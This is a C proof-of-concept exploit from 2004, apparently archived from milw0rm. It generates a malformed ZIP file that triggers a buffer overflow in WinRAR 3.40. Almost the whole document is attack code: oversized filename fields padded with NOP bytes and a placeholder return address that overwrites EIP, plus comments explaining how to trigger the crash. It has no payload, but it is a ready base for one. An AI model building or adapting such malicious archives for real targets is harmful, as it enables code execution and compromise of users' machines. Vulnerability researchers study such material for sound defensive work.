/*
WinRAR 3.40 Buffer Overflow POC
Thanks to Miguel Tarasco Acuna. He has made a wonderful code for
Microsoft Windows Vulnerability in Compressed (zipped) Folders (MS04-034)
which I edited and made this code by.


Coded by Vafa Khoshaein - vkhoshain@hotmail.com
Vulnerability discovery date : December 10, 2004


Run this code and creat vulnerable_zip.zip then open the file in WinRAR 3.40
there exists a file, Try to delete the file - SECU


*/
#include <stdio.h>
#include <windows.h>


#pragma pack(1)



#define DATOS "vkhoshain@hotmail.com"


typedef struct {
DWORD Signature;
WORD VersionNeeded;
WORD GeneralPurposeFlag;
WORD CompressionMethod;
WORD ModFileTime;
WORD ModFileDate;
DWORD Crc32;
DWORD CompressedSize;
DWORD UncompressedSize;
WORD FilenameLength;
WORD ExtraFieldLength;
}TOPHEADER;



typedef struct {
DWORD Signature;
WORD MadeVersion;
WORD VersionNeeded;
WORD GeneralPurposeFlag;
WORD CompressionMethod;
WORD ModFileTime;
WORD ModFileDate;
DWORD Crc32;
DWORD CompressedSize;
DWORD UncompressedSize;
WORD FilenameLength;
WORD ExtraFieldLength;
WORD FileCommentLength;
WORD DiskNumberStart;
WORD InternalFileAttributes;
DWORD ExternalFileAttributes;
DWORD RelativeOffsetOfLocalHeader;
}MIDDLEHEADER;


typedef struct {
DWORD Signature;
WORD NumOfThisDisk;
WORD NumDisckStartCentralDirectory;
WORD NumEntriesCentralDirOnThisDisk;
WORD TotalNumEntriesCentralDir;
DWORD SizeCentralDirectory;
DWORD OffsetCentraDirRespectStartDiskNum;
WORD ZipCommentLength;
}BOTTOMHEADER;


int main(int argc,char *argv[]) {


FILE *ZipFile;
TOPHEADER *Cabecera1;
MIDDLEHEADER *Cabecera2;
BOTTOMHEADER *Cabecera3;


DWORD c;
UINT i;
char *filename;
char *url;
printf("\nWinRAR 3.40 Buffer Overflow POC\n");
printf("\nCoded by Vafa Khoshaein (vkhoshain@hotmail.com)\n");



if (!(ZipFile=fopen("vulnerable_zip.zip","w+b"))) {
printf("\nError in creating vulnerable_zip.zip\n");
exit(1);
}


c=30800;
filename=(char*)malloc(sizeof(char)*c);
memset(filename,0,sizeof(filename));



for( i=0;i<30800;i++) filename[i]=0x90;


// Return Address
memcpy(&filename[479],"AAAA",4); /////////// Ret Addr EIP 0x41414141


Cabecera1=(TOPHEADER*)malloc(sizeof(TOPHEADER));
Cabecera2=(MIDDLEHEADER*)malloc(sizeof(MIDDLEHEADER));
Cabecera3=(BOTTOMHEADER*)malloc(sizeof(BOTTOMHEADER));
memset(Cabecera1,0,sizeof(TOPHEADER));
memset(Cabecera2,0,sizeof(MIDDLEHEADER));
memset(Cabecera3,0,sizeof(BOTTOMHEADER));


Cabecera1->Signature=0x00000050; // DWORD
Cabecera1->VersionNeeded=0x000A; // WORD
Cabecera1->GeneralPurposeFlag=0x0002; // WORD
Cabecera1->CompressionMethod=0x0000; // WORD
Cabecera1->ModFileTime=0x1362; // WORD
Cabecera1->ModFileDate=0x3154; // WORD
Cabecera1->Crc32=0x85B36639; // DWORD
Cabecera1->CompressedSize=0x00000015; // DWORD
Cabecera1->UncompressedSize=0x00000015; // DWORD
Cabecera1->FilenameLength=(WORD)c; // WORD 0x0400
Cabecera1->ExtraFieldLength=0x0000; // WORD
Cabecera2->Signature=0x02014B50; // DWORD
Cabecera2->MadeVersion=0x0014; // WORD
Cabecera2->VersionNeeded=0x000A; // WORD
Cabecera2->GeneralPurposeFlag=0x0002; // WORD
Cabecera2->CompressionMethod=0x0000; // WORD
Cabecera2->ModFileTime=0x1362; // WORD
Cabecera2->ModFileDate=0x3154; // WORD
Cabecera2->Crc32=0x85B36639; // DWORD
Cabecera2->CompressedSize=0x00000015; // DWORD
Cabecera2->UncompressedSize=0x00000015; // DWORD
Cabecera2->FilenameLength=(WORD)c; // WORD 0x0400;//strlen(filename);
Cabecera2->ExtraFieldLength=0x0000; // WORD
Cabecera2->FileCommentLength=0x0000; // WORD
Cabecera2->DiskNumberStart=0x0000; // WORD
Cabecera2->InternalFileAttributes=0x0001; // WORD
Cabecera2->ExternalFileAttributes=0x00000020; // DWORD
Cabecera2->RelativeOffsetOfLocalHeader=0x00000000; // DWORD
Cabecera3->Signature=0x06054B50; // DWORD
Cabecera3->NumOfThisDisk=0x0000; // WORD
Cabecera3->NumDisckStartCentralDirectory=0x0000; // WORD
Cabecera3->NumEntriesCentralDirOnThisDisk=0x0001;
Cabecera3->TotalNumEntriesCentralDir=0x0001;
Cabecera3->SizeCentralDirectory=sizeof(MIDDLEHEADER)+c;
Cabecera3->OffsetCentraDirRespectStartDiskNum=sizeof(TOPHEADER)+strlen(DATOS)+c;
Cabecera3->ZipCommentLength=0x0000;


fwrite(Cabecera1, sizeof(TOPHEADER), 1,ZipFile);

fwrite(filename, c, 1,ZipFile);
fwrite(DATOS,strlen(DATOS),1,ZipFile);


fwrite(Cabecera2, sizeof(MIDDLEHEADER), 1,ZipFile);
fwrite(filename, c, 1,ZipFile);
fwrite(Cabecera3, sizeof(BOTTOMHEADER), 1,ZipFile);


fclose(ZipFile);
printf("\nvulnerable_zip.zip has been created\n\n");
return 1;
}

// milw0rm.com [2004-12-16]